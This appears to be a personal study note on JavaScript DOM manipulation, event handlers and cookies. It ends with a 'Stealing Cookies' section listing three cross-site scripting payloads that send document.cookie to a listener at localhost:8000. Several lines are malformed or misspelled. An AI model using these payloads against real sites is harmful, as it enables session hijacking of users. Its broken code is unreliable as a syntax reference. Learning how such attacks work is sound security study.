

## To find the required elements and tags.
getEelementById()
getElementsByTagName()


## To Modify the content.
--- .innerHTML = ''




## Event Handlers

| Event       | Description                                        |
| ----------- | -------------------------------------------------- |
| onchange    | An HTML element has been changed                   |
| onclick     | The user clicks an HTML element                    |
| onmouseover | The user moves the mouse over an HTML element      |
| onmouseout  | The user moves the mouse away from an HTML element |
| onkeydown   | The user pushes a keyboard key                     |
| onload      | The browser has finished loading the page          |


## Cookies

document.cookie = ""   "Set the cookie"

document.cookie = "sessionid=; expires = Fri, 10 Aug 2025 00:00:00 IST;"; (To delete the cookie we set the expire date and time)


## Stealing Cookies

document.location = "https://localhost:8000/?+document.cookie+"
	- This is one of the methods where this tag redirects to the link and posts the cookie.
document.write('<img src="https://localhost:8000/?+document.cookie+ '" /');

	- The above one is using the image 

new Image().src = "http://localhost:8000/?"+document.cookie+;

